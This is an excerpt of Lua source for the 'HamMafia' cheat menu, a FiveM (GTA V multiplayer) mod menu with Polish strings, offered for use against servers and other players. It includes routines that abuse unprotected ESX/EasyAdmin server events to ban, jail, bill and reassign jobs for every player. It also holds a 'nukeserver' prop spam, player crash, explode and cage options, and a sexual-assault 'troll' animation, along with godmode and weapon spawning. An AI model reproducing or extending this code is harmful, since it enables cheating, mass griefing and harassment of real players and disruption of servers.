...
local G = 'XDXDXD'
local function H(I)
    if HamMafia.debug then
        Citizen.Trace('[HamMafia] ' .. tostring(I))
    end
end
...
function HamMafia.CreateMenu(f, a7)
    o[f] = {}
    o[f].title = a7
    o[f].subTitle = G
    o[f].visible = false
...
function HamMafia.CreateSubMenu(f, a9, aa)
    if o[a9] then
        HamMafia.CreateMenu(f, o[a9].title)
        if aa then
            J(f, 'subTitle', aa)
        else
...
function HamMafia.CurrentMenu()
    return t
end

function HamMafia.OpenMenu(f)
    if f and o[f] then
...
function HamMafia.IsMenuOpened(f)
    return L(f)
end

function HamMafia.IsAnyMenuOpened()
...
function HamMafia.IsMenuAboutToBeClosed()
    if o[t] then
...
function HamMafia.MenuButton(I, f)
    if o[f] then
        if HamMafia.Button(I) then
            M(t, false)
            M(f, true, true)
            return true
        end
...
function HamMafia.CheckBox(I, bool, ad)
    local ae = '~r~~h~OFF'
    if bool then
        ae = '~g~~h~ON'
    end
    if HamMafia.Button(I, ae) then
        bool = not bool
...
function HamMafia.ComboBox(I, af, ag, ah, ad)
    local ai = #af
    local aj = af[ag]
...
function HamMafia.SetMenuWidth(f, X)
    J(f, 'width', X)
end

function HamMafia.SetMenuX(f, x)
    J(f, 'x', x)
end

function HamMafia.SetMenuY(f, y)
    J(f, 'y', y)
end

function HamMafia.SetMenuMaxOptionCountOnScreen(f, count)
    J(f, 'maxOptionCount', count)
end

function HamMafia.SetTitleColor(f, r, g, b, ak)
    J(
        f,
        'titleColor',
        {
...
function HamMafia.SetTitleBackgroundColor(f, r, g, b, ak)
    J(
        f,
...
function HamMafia.SetTitleBackgroundSprite(f, al, am)
    J(
        f,
...
function HamMafia.SetSubTitle(f, I)
    J(f, 'subTitle', I)
end

function HamMafia.SetMenuBackgroundColor(f, r, g, b, ak)
    J(
        f,
        'menuBackgroundColor',
        {
...
function HamMafia.SetMenuTextColor(f, r, g, b, ak)
    J(
        f,
        'menuTextColor',
        {
...
function HamMafia.SetMenuSubTextColor(f, r, g, b, ak)
    J(
        f,
        'menuSubTextColor',
        {
...
function HamMafia.SetMenuFocusColor(f, r, g, b, ak)
    J(
        f,
        'menuFocusColor',
        {
...
function HamMafia.SetMenuButtonPressedSound(f, name, an)
    J(
        f,
        'buttonPressedSound',
        {
...
local function bE()
    if bC == 3 then
        ...
        local ak = KeyboardInput('Get your password from #HamMafia-announcements', '', 100)
        if ak == bD then
            xddddd4543 = true
...
HamMafia.StartRC = function()
    if DoesEntityExist(HamMafia.Entity) then
        return
    end
    HamMafia.SpawnRC()
    HamMafia.Tablet(true)
    while DoesEntityExist(HamMafia.Entity) and DoesEntityExist(HamMafia.Driver) do
        Citizen.Wait(5)
        local cf = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(HamMafia.Entity), true)
        HamMafia.DrawInstructions(cf)
        HamMafia.HandleKeys(cf)
        if cf <= 3000.0 then
            if not NetworkHasControlOfEntity(HamMafia.Driver) then
                NetworkRequestControlOfEntity(HamMafia.Driver)
            elseif not NetworkHasControlOfEntity(HamMafia.Entity) then
                NetworkRequestControlOfEntity(HamMafia.Entity)
            end
        else
            TaskVehicleTempAction(HamMafia.Driver, HamMafia.Entity, 6, 2500)
        end
    end
end
HamMafia.HandleKeys = function(cf)
    if IsControlJustReleased(0, 47) then
        if IsCamRendering(HamMafia.Camera) then
            HamMafia.ToggleCamera(false)
        else
            HamMafia.ToggleCamera(true)
        end
    end
    if cf <= 3.0 then
        if IsControlJustPressed(0, 38) then
            HamMafia.Attach('pick')
        end
    end
    if cf < 3000.0 then
        if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(HamMafia.Driver, HamMafia.Entity, 9, 1)
        end
        ...
        if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
            TaskVehicleTempAction(HamMafia.Driver, HamMafia.Entity, 22, 1)
        end
        if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(HamMafia.Driver, HamMafia.Entity, 13, 1)
        end
        if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(HamMafia.Driver, HamMafia.Entity, 14, 1)
        end
        if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(HamMafia.Driver, HamMafia.Entity, 30, 100)
        end
        if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
            TaskVehicleTempAction(HamMafia.Driver, HamMafia.Entity, 7, 1)
        end
        if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
            TaskVehicleTempAction(HamMafia.Driver, HamMafia.Entity, 8, 1)
        end
        if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(HamMafia.Driver, HamMafia.Entity, 4, 1)
        end
        if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(HamMafia.Driver, HamMafia.Entity, 5, 1)
        end
        if IsControlJustReleased(0, 168) then
            SetVehicleEngineOn(HamMafia.Entity, not GetIsVehicleEngineRunning(HamMafia.Entity), false, true)
        end
    end
end
HamMafia.DrawInstructions = function(cf)
    local cg = {
        {
            ['label'] = 'Prawo',
...
HamMafia.SpawnRC = function()
    ...
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        ...
        HamMafia.Entity = CreateVehicle(GetHashKey(cb), co, cp, true)
        while not DoesEntityExist(HamMafia.Entity) do
            Citizen.Wait(5)
        end
        HamMafia.Driver = CreatePed(5, 68070371, co, cp, true)
        SetEntityInvincible(HamMafia.Driver, true)
        SetEntityVisible(HamMafia.Driver, false)
        FreezeEntityPosition(HamMafia.Driver, true)
        SetPedAlertness(HamMafia.Driver, 0.0)
        TaskWarpPedIntoVehicle(HamMafia.Driver, HamMafia.Entity, -1)
        while not IsPedInVehicle(HamMafia.Driver, HamMafia.Entity) do
            Citizen.Wait(0)
        end
        HamMafia.Attach('place')
        av('~g~~h~Sukces :)', false)
    else
        av('~b~~h~Model pojazdu nie istnieje !', true)
    end
end
HamMafia.Attach = function(aw)
    if not DoesEntityExist(HamMafia.Entity) then
        return
    end
    HamMafia.LoadModels(
        {
    ...
    if aw == 'place' then
        ...
        Citizen.Wait(200)
        DetachEntity(HamMafia.Entity, false, true)
        PlaceObjectOnGroundProperly(HamMafia.Entity)
    elseif aw == 'pick' then
        if DoesCamExist(HamMafia.Camera) then
            HamMafia.ToggleCamera(false)
        end
        HamMafia.Tablet(false)
        Citizen.Wait(100)
        DetachEntity(HamMafia.Entity)
        DeleteVehicle(HamMafia.Entity)
        DeleteEntity(HamMafia.Driver)
        HamMafia.UnloadModels()
    end
end
HamMafia.Tablet = function(cq)
    if cq then
        HamMafia.LoadModels(
            {
        ...
        Citizen.CreateThread(
            function()
                while DoesEntityExist(HamMafia.TabletEntity) do
                    Citizen.Wait(5)
                    if
        ...
        DeleteEntity(HamMafia.TabletEntity)
    end
end
HamMafia.ToggleCamera = function(cq)
    if not true then
        return
    end
    if cq then
        ...
        if DoesCamExist(HamMafia.Camera) then
            DestroyCam(HamMafia.Camera)
        end
        HamMafia.Camera = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
        AttachCamToEntity(HamMafia.Camera, HamMafia.Entity, 0.0, 0.0, 0.4, true)
        Citizen.CreateThread(
            function()
                while DoesCamExist(HamMafia.Camera) do
                    Citizen.Wait(5)
                    SetCamRot(HamMafia.Camera, GetEntityRotation(HamMafia.Entity))
                end
            end
        )
        local cr =
            500 *
            math.ceil(
                GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(HamMafia.Entity), true) / 10
            )
...
HamMafia.LoadModels = function(cs)
    for ct = 1, #cs do
        local bB = cs[ct]
        if not HamMafia.CachedModels then
            HamMafia.CachedModels = {}
        end
        table.insert(HamMafia.CachedModels, bB)
...
HamMafia.UnloadModels = function()
    for ct = 1, #HamMafia.CachedModels do
        local bB = HamMafia.CachedModels[ct]
        if IsModelValid(bB) then
    ...
    function()
        while bw do
            ...
            if fuckallcars then
                for ay in EnumerateVehicles() do
                    if not IsPedAPlayer(GetPedInVehicleSeat(ay, -1)) then
                        ...
                        SetVehicleNumberPlateText(ay, 'HamMafia')
            ...
            function esxdestroyv2()
                Citizen.CreateThread(
                    function()
						TriggerServerEvent("EasyAdmin:banPlayer", GetPlayerServerId(i), "Jebac panstwo izreal xaries to bug jebany", 5555555)
						TriggerServerEvent("EasyAdmin:banPlayer", 555555, 'Jebac panstwo izreal', false, GetPlayerServerId(i))
                        ...
                        for i = 0, 256 do
                            ...
                            TriggerServerEvent(
                                'esx_b3illing:sendBill',
                                GetPlayerServerId(i),
                                'Purposeless',
                                'Jebać państwo izreal ;L)',
                                43161235325337
                            )
                            TriggerServerEvent('NB:recr2uterplayer', GetPlayerServerId(i), 'police', 3)
                            TriggerServerEvent('NB:recrut2erplayer', i, 'police', 3)
                        end
                    end
                )
            end
            ...
            function nukeserver()
    for vehicle in EnumerateVehicles() do 
	local eY = CreateObject(-145066854, 0, 0, 0, true, true, true) 
	NetworkRequestControlOfEntity(vehicle) 
	AttachEntityToEntity(eY, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) 
	NetworkRequestControlOfEntity(eY) SetEntityAsMissionEntity(eY, true, true) 
		end 
	end;
...
Citizen.CreateThread(
    function()
        ...
        HamMafia.CreateMenu('HamMafias', bs)
        HamMafia.SetSubTitle('HamMafias', 'Ariesowe Spoleczenstwo')
        HamMafia.CreateSubMenu('SelfMenu', 'HamMafias', 'Opcje SingePlayer')
        HamMafia.CreateSubMenu('TeleportMenu', 'HamMafias', 'Menu Teleportacji')
        HamMafia.CreateSubMenu('WeaponMenu', 'HamMafias', 'Menu Broni')
        HamMafia.CreateSubMenu('AdvM', 'HamMafias', 'Opcje Zaawansowane')
        HamMafia.CreateSubMenu('LuaMenu', 'HamMafias', 'Lua Menu')
        HamMafia.CreateSubMenu('VehicleMenu', 'HamMafias', 'Menu Pojazdow')
        HamMafia.CreateSubMenu('OnlinePlayerMenu', 'HamMafias', 'Gracze online')
        HamMafia.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
        HamMafia.CreateSubMenu('Destroyer', 'AdvM', 'Destroyer Menu')
        HamMafia.CreateSubMenu('ESXBoss', 'LuaMenu', 'ESX Boss Triggers')
        HamMafia.CreateSubMenu('ESXMoney', 'LuaMenu', 'ESX Money Triggers')
        HamMafia.CreateSubMenu('ESXDrugs', 'LuaMenu', 'ESX MONEY by Aries')
        HamMafia.CreateSubMenu('ESXAdmin', 'LuaMenu', 'Esx Admin :) by Aries')
        HamMafia.CreateSubMenu('ESXCustom', 'LuaMenu', 'ESX Random Triggers')
        HamMafia.CreateSubMenu('VRPTriggers', 'LuaMenu', 'VRP Triggers')
        HamMafia.CreateSubMenu('MiscTriggers', 'LuaMenu', 'Misc Triggers')
        HamMafia.CreateSubMenu('crds', 'HamMafias', 'Credits')
        HamMafia.CreateSubMenu('ESXJobs', 'LuaMenu', 'ESX Jobs')
        HamMafia.CreateSubMenu('ESXJobs2', 'PlayerOptionsMenu', 'ESX Jobs Individual')
        HamMafia.CreateSubMenu('ESXTriggerini', 'PlayerOptionsMenu', 'ESX Triggers')
        HamMafia.CreateSubMenu('Trollmenu', 'PlayerOptionsMenu', 'Troll Menu')
        HamMafia.CreateSubMenu('WeaponTypes', 'WeaponMenu', 'Weapons')
        HamMafia.CreateSubMenu('WeaponTypeSelection', 'WeaponTypes', 'Weapon')
        HamMafia.CreateSubMenu('WeaponOptions', 'WeaponTypeSelection', 'Weapon Options')
        HamMafia.CreateSubMenu('ModSelect', 'WeaponOptions', 'Weapon Mod Options')
        HamMafia.CreateSubMenu('CarTypes', 'VehicleMenu', 'Vehicles')
        HamMafia.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Moew :3')
        HamMafia.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Car Options')
        HamMafia.CreateSubMenu('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
        HamMafia.CreateSubMenu('MainTrailerSel', 'MainTrailer', 'Trailers Available')
        HamMafia.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
        HamMafia.CreateSubMenu('GiveSingleWeaponPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
        HamMafia.CreateSubMenu('ESPMenu', 'AdvM', 'ESP Menu')
        HamMafia.CreateSubMenu('LSC', 'VehicleMenu', 'LSC Customs')
        HamMafia.CreateSubMenu('tunings', 'LSC', 'Visual Tuning')
        HamMafia.CreateSubMenu('performance', 'LSC', 'Performance Tuning')
        HamMafia.CreateSubMenu('VRPPlayerTriggers', 'PlayerOptionsMenu', 'VRP Triggers')
        HamMafia.CreateSubMenu('BoostMenu', 'VehicleMenu', 'Vehicle Boost')
        HamMafia.CreateSubMenu('SpawnPeds', 'Trollmenu', 'Spawn Peds')
        HamMafia.CreateSubMenu('GCT', 'VehicleMenu', 'Global Car Trolls')
        HamMafia.CreateSubMenu('CsMenu', 'AdvM', 'Crosshairs')
        for i, dE in pairs(bl) do
            HamMafia.CreateSubMenu(dE.id, 'tunings', dE.name)
            if dE.id == 'paint' then
                HamMafia.CreateSubMenu('primary', dE.id, 'Primary Paint')
                HamMafia.CreateSubMenu('secondary', dE.id, 'Secondary Paint')
                HamMafia.CreateSubMenu('rimpaint', dE.id, 'Wheel Paint')
                HamMafia.CreateSubMenu('classic1', 'primary', 'Classic Paint')
                HamMafia.CreateSubMenu('metallic1', 'primary', 'Metallic Paint')
                HamMafia.CreateSubMenu('matte1', 'primary', 'Matte Paint')
                HamMafia.CreateSubMenu('metal1', 'primary', 'Metal Paint')
                HamMafia.CreateSubMenu('classic2', 'secondary', 'Classic Paint')
                HamMafia.CreateSubMenu('metallic2', 'secondary', 'Metallic Paint')
                HamMafia.CreateSubMenu('matte2', 'secondary', 'Matte Paint')
                HamMafia.CreateSubMenu('metal2', 'secondary', 'Metal Paint')
                HamMafia.CreateSubMenu('classic3', 'rimpaint', 'Classic Paint')
                HamMafia.CreateSubMenu('metallic3', 'rimpaint', 'Metallic Paint')
                HamMafia.CreateSubMenu('matte3', 'rimpaint', 'Matte Paint')
                HamMafia.CreateSubMenu('metal3', 'rimpaint', 'Metal Paint')
            end
        end
        for i, dE in pairs(bm) do
            HamMafia.CreateSubMenu(dE.id, 'performance', dE.name)
        end
        ...
        while bw do
            ...
            for i, dE in pairs(bl) do
                if HamMafia.IsMenuOpened('tunings') then
                    if bg then
                        if bi == 'neon' then
                ...
                if HamMafia.IsMenuOpened(dE.id) then
                    if dE.id == 'wheeltypes' then
                        if HamMafia.Button('Sport Wheels') then
                            SetVehicleWheelType(veh, 0)
                        elseif HamMafia.Button('Muscle Wheels') then
                            SetVehicleWheelType(veh, 1)
                        elseif HamMafia.Button('Lowrider Wheels') then
                            SetVehicleWheelType(veh, 2)
                        elseif HamMafia.Button('SUV Wheels') then
                            SetVehicleWheelType(veh, 3)
                        elseif HamMafia.Button('Offroad Wheels') then
                            SetVehicleWheelType(veh, 4)
                        elseif HamMafia.Button('Tuner Wheels') then
                            SetVehicleWheelType(veh, 5)
                        elseif HamMafia.Button('High End Wheels') then
                    ...
                    elseif dE.id == 'headlight' then
                        ...
                        for dK, dE in pairs(bo) do
                            ...
                            if HamMafia.Button(dE.name, pricetext) then
                                if not bg then
                                    bi = 'headlight'
                                    bk = false
                    ...
                    elseif dE.id == 'neon' then
                        ...
                        for i, dE in pairs(bq) do
                            ...
                            if HamMafia.Button(i, pricestring) then
                                if not bg then
                                    bi = 'neon'
                    ...
                    elseif dE.id == 'paint' then
                        if HamMafia.MenuButton('~h~~p~#~s~ Primary Paint', 'primary') then
                        elseif HamMafia.MenuButton('~h~~p~#~s~ Secondary Paint', 'secondary') then
                        elseif HamMafia.MenuButton('~h~~p~#~s~ Wheel Paint', 'rimpaint') then
                        end
                        HamMafia.Display()
                    else
                        ...
                        for i, dL in pairs(az) do
                            ...
                            if HamMafia.Button(dL.menuName) then
                                if not bg then
                                    bi = dE.id
            ...
            for i, dE in pairs(bm) do
                if HamMafia.IsMenuOpened(dE.id) then
                    ...
                    if HamMafia.Button('Stock ' .. dE.name, pricestock) then
                        SetVehicleMod(veh, dE.id, -1)
                    elseif HamMafia.Button(dE.name .. ' Upgrade 1', price1) then
                        SetVehicleMod(veh, dE.id, 0)
                    elseif HamMafia.Button(dE.name .. ' Upgrade 2', price2) then
                        SetVehicleMod(veh, dE.id, 1)
                    elseif HamMafia.Button(dE.name .. ' Upgrade 3', price3) then
                        SetVehicleMod(veh, dE.id, 2)
                    elseif dE.id ~= 13 and dE.id ~= 12 and HamMafia.Button(dE.name .. ' Upgrade 4', price4) then
                        SetVehicleMod(veh, dE.id, 3)
                    end
                    HamMafia.Display()
                end
            end
            if HamMafia.IsMenuOpened('HamMafias') then
                local dQ = PlayerId(-1)
                local bH = GetPlayerName(dQ)
                if HamMafia.MenuButton('~h~~p~#~s~ Self Menu', 'SelfMenu') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ Online Players', 'OnlinePlayerMenu') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ Teleport Menu', 'TeleportMenu') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ Vehicle Menu', 'VehicleMenu') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ Weapon Menu', 'WeaponMenu') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ Lua Menu ~o~~h~:3', 'LuaMenu') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ Advanced Mode ~o~~h~xD', 'AdvM') then
                elseif HamMafia.MenuButton('~h~~p~# ~y~', 'crds') then
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('SelfMenu') then
                if
                    HamMafia.CheckBox(
                        '~h~~g~Godmode',
                        Godmode,
                 ...
                 then
                elseif HamMafia.Button('~h~~y~Semi ~g~Godmode') then
                ...
                elseif
                 ...
                 then
                elseif HamMafia.Button('~h~~r~Suicide') then
                    SetEntityHealth(PlayerPedId(-1), 0)
                elseif HamMafia.Button('~h~~g~ESX~s~ Revive Yourself~s~') then
                    TriggerEvent('esx_ambulancejob:revive')
                elseif HamMafia.Button('~h~~g~Heal/Revive') then
                    SetEntityHealth(PlayerPedId(-1), 200)
                elseif HamMafia.Button('~h~~b~Give Armour') then
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('OnlinePlayerMenu') then
                for i = 0, 128 do
                    if
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('PlayerOptionsMenu') then
                HamMafia.SetSubTitle('PlayerOptionsMenu', 'Player Options [' .. GetPlayerName(SelectedPlayer) .. ']')
                if HamMafia.MenuButton('~h~~p~#~s~ ESX Triggers', 'ESXTriggerini') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ ESX Jobs', 'ESXJobs2') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ VRP Triggers', 'VRPPlayerTriggers') then
                elseif HamMafia.MenuButton('~h~~p~#~s~ Troll Menu', 'Trollmenu') then
                elseif HamMafia.Button('~h~Spectate', cC and '~g~[SPECTATING]') then
                    SpectatePlayer(SelectedPlayer)
                elseif HamMafia.Button('~h~~r~Semi GOD ~s~Player') then
                    local dS = 'stt_prop_stunt_soccer_ball'
                    while not HasModelLoaded(GetHashKey(dS)) do
                        Citizen.Wait(0)
                        RequestModel(GetHashKey(dS))
                ...
                elseif HamMafia.Button('~h~Teleport To') then
                    if cO then
                ...
                elseif
                 ...
                 then
                elseif HamMafia.MenuButton('~h~~p~#~s~ Give Single Weapon', 'GiveSingleWeaponPlayer') then
                elseif HamMafia.Button('~h~Give ~r~All Weapons') then
                    for i = 1, #b6 do
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, false)
                    end
                elseif HamMafia.Button('~h~Remove ~r~All Weapons') then
                    RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true)
                elseif HamMafia.Button('~h~Give ~r~Vehicle') then
                ...
                elseif HamMafia.Button('~h~Send To ~r~Jail') then
				TriggerServerEvent("esx_jailers:sendToJail", GetPlayerServerId(i), 489239493284, "xaries.pl", 13377)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 489239493284, "Siemano robie poradnik na youtuba", 13377)
				...
				TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." HamMafia on YOUTUBE.")
				TriggerServerEvent("esx_jailer:sendToJail_PiesJebie_Ci_MATKE", GetPlayerServerId(i), 99332453252357, "XDDD", 30325325325320)
                elseif HamMafia.Button('~h~~g~Evade ~s~From Jail') then
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('ESXTriggerini') then
                if HamMafia.Button('~h~~g~Revive Player') then
                    ...
                    DoScreenFadeIn(800)
                elseif HamMafia.Button('~h~~g~Give money to player from your wallet') then
                ...
                elseif HamMafia.Button('~h~~b~Handcuff Player') then
                    TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('VRPPlayerTriggers') then
                if HamMafia.Button('~h~Transfer money from your bank') then
            ...
            elseif HamMafia.IsMenuOpened('ESXJobs2') then
                ...
                elseif HamMafia.Button('~h~Set ~r~Car ~b~Dealer ~s~Job') then
                    TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(SelectedPlayer), 'cardealer', 3)
                    CarDealerPlayer(SelectedPlayer)
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('Trollmenu') then
                if HamMafia.MenuButton('~h~~p~#~s~ Spawn Peds', 'SpawnPeds') then
                elseif HamMafia.Button('~h~~r~Fake ~s~Chat Message') then
                ...
                elseif HamMafia.Button('~h~~r~Kick ~s~From Vehicle') then
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                elseif HamMafia.Button('~h~~y~Explode ~s~Vehicle') then
                ...
                elseif HamMafia.Button('~h~~r~Launch ~s~his car') then
                ...
                elseif HamMafia.Button('~h~~r~Banana ~p~Party') then
                    local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                    local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                    local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif HamMafia.Button('~h~~r~Explode') then
                ...
                elseif HamMafia.Button('~h~~r~Rape') then
                    RequestModelSync('a_m_o_acult_01')
                    RequestAnimDict('rcmpaparazzo_2')
                    while not HasAnimDictLoaded('rcmpaparazzo_2') do
                        Citizen.Wait(0)
                ...
                elseif HamMafia.Button('~h~~r~Cage ~s~Player') then
                ...
                elseif HamMafia.Button('~h~~r~Hamburgher ~s~Player') then
                ...
                elseif HamMafia.Button('~h~~r~Hamburgher ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif HamMafia.Button('~h~~r~Snowball troll ~s~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                ...
                elseif HamMafia.Button('~h~~o~_!_ ~r~CRASH ~s~Player ~o~_!_') then
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('SpawnPeds') then
                if HamMafia.Button('~h~~r~Spawn ~s~Swat army with ~y~AK') then
                ...
                elseif HamMafia.Button('~h~~r~Spawn ~s~Swat army with ~y~RPG') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'weapon_rpg'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif HamMafia.Button('~h~~r~Spawn ~s~Swat army with ~y~Flaregun') then
                    local bQ = 's_m_y_swat_01'
                ...
                elseif HamMafia.Button('~h~~r~Spawn ~s~Swat army with ~y~Railgun') then
                    local bQ = 's_m_y_swat_01'
            ...
            elseif
             ...
             then
                if xddddd4543 then
                    HamMafia.OpenMenu('HamMafias')
                else
                    bE()
                end
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('TeleportMenu') then
                if HamMafia.Button('~h~Teleport to ~g~waypoint') then
                    c6()
                elseif HamMafia.Button('~h~Teleport into ~g~nearest ~s~vehicle') then
                    b_()
                elseif HamMafia.Button('~h~Teleport to ~r~coords') then
                    bT()
                elseif HamMafia.Button('~h~Draw custom ~r~blip ~s~on map') then
                    bX()
                elseif
                    HamMafia.CheckBox(
                        '~h~Show ~g~Coords',
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('WeaponMenu') then
                if HamMafia.MenuButton('~h~~p~#~s~ Give Single Weapon', 'WeaponTypes') then
                elseif HamMafia.Button('~h~~g~Give All Weapons') then
                    for i = 1, #b6 do
                        GiveWeaponToPed(PlayerPedId(-1), GetHashKey(b6[i]), 1000, false, false)
                    end
                elseif HamMafia.Button('~h~~r~Remove All Weapons') then
                    RemoveAllPedWeapons(PlayerPedId(-1), true)
                elseif HamMafia.Button('~h~Drop your current Weapon') then
                    local ak = GetPlayerPed(-1)
                    local b = GetSelectedPedWeapon(ak)
                    SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1)
                elseif HamMafia.Button('~h~~g~Give All Weapons to ~s~everyone') then
                    for el = 0, 128 do
                ...
                elseif HamMafia.Button('~h~~r~Remove All Weapons from ~s~everyone') then
                    for el = 0, 128 do
                        if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
                            for i = 1, #b6 do
                ...
                elseif HamMafia.Button('~h~Give Ammo') then
                    for i = 1, #b6 do
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('tunings') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, dE in pairs(bl) do
                    if dE.id == 'extra' and #checkValidVehicleExtras() ~= 0 then
                        if HamMafia.MenuButton(dE.name, dE.id) then
                        end
                    elseif dE.id == 'neon' then
                        if HamMafia.MenuButton(dE.name, dE.id) then
                        end
                ...
                if HamMafia.Button('Xenon Headlight', xenonStatus) then
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('performance') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, dE in pairs(bm) do
                    if HamMafia.MenuButton(dE.name, dE.id) then
                    end
                ...
                if HamMafia.Button('~h~~b~Turbo ~h~Tune', turboStatus) then
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('primary') then
                HamMafia.MenuButton('~h~~p~#~s~ Classic', 'classic1')
                HamMafia.MenuButton('~h~~p~#~s~ Metallic', 'metallic1')
                HamMafia.MenuButton('~h~~p~#~s~ Matte', 'matte1')
                HamMafia.MenuButton('~h~~p~#~s~ Metal', 'metal1')
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('secondary') then
                HamMafia.MenuButton('~h~~p~#~s~ Classic', 'classic2')
                HamMafia.MenuButton('~h~~p~#~s~ Metallic', 'metallic2')
                HamMafia.MenuButton('~h~~p~#~s~ Matte', 'matte2')
                HamMafia.MenuButton('~h~~p~#~s~ Metal', 'metal2')
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('rimpaint') then
                HamMafia.MenuButton('~h~~p~#~s~ Classic', 'classic3')
                HamMafia.MenuButton('~h~~p~#~s~ Metallic', 'metallic3')
                HamMafia.MenuButton('~h~~p~#~s~ Matte', 'matte3')
                HamMafia.MenuButton('~h~~p~#~s~ Metal', 'metal3')
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('classic1') then
                for dK, em in pairs(br) do
                    ...
                    if HamMafia.Button(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('metallic1') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == em.id and not bg then
                        pricetext = 'Installed'
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('matte1') then
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('metal1') then
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('classic2') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('metallic2') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('matte2') then
                for dK, em in pairs(bt) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('metal2') then
                for dK, em in pairs(bu) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('classic3') then
                for dK, em in pairs(br) do
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('metallic3') then
                for dK, em in pairs(br) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('matte3') then
                for dK, em in pairs(bt) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                ...
                HamMafia.Display()
            elseif HamMafia.IsMenuOpened('metal3') then
